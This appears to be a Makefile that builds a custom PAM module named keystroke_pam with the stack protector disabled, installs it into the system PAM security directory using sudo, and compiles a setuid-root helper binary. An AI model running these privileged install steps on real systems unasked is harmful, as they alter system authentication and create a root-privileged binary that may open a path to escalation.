all:
	gcc -fPIC -fno-stack-protector -c keystroke_pam.c
	sudo ld -x --shared -o /lib/x86_64-linux-gnu/security/main_pam.so     keystroke_pam.o
	gcc binary_helper.c -o binary_helper
	sudo chown root binary_helper
	sudo chmod u+s binary_helper